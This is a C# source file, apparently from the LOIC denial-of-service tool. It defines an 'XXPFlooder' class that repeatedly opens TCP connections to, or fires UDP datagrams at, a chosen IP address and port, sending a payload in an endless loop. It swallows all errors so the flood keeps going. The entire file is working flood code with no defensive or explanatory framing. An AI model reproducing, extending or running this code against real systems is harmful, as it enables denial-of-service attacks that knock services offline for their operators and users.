
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace LOIC
{
  internal class XXPFlooder : IFlooder
  {
    private BackgroundWorker bw;

    public bool IsFlooding { get; set; }

    public int FloodCount { get; set; }

    public string IP { get; set; }

    public int Port { get; set; }

    public int Protocol { get; set; }

    public int Delay { get; set; }

    public bool Resp { get; set; }

    public string Data { get; set; }

    public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data)
    {
      this.IP = ip;
      this.Port = port;
      this.Protocol = proto;
      this.Delay = delay;
      this.Resp = resp;
      this.Data = data;
    }

    public void Start()
    {
      this.IsFlooding = true;
      this.bw = new BackgroundWorker();
      this.bw.DoWork += new DoWorkEventHandler(this.bw_DoWork);
      this.bw.RunWorkerAsync();
      this.bw.WorkerSupportsCancellation = true;
    }

    public void Stop()
    {
      this.IsFlooding = false;
      this.bw.CancelAsync();
    }

    private void bw_DoWork(object sender, DoWorkEventArgs e)
    {
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes(this.Data);
        IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(this.IP), this.Port);
        while (this.IsFlooding)
        {
          if (this.Protocol == 1)
          {
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            {
              Blocking = this.Resp
            };
            socket.Connect((EndPoint) ipEndPoint);
            try
            {
              while (this.IsFlooding)
              {
                ++this.FloodCount;
                socket.Send(bytes);
                if (this.Delay > 0)
                  Thread.Sleep(this.Delay);
              }
            }
            catch
            {
            }
          }
          if (this.Protocol == 2)
          {
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
            {
              Blocking = this.Resp
            };
            try
            {
              while (this.IsFlooding)
              {
                ++this.FloodCount;
                socket.SendTo(bytes, SocketFlags.None, (EndPoint) ipEndPoint);
                if (this.Delay > 0)
                  Thread.Sleep(this.Delay);
              }
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
    }
  }
}
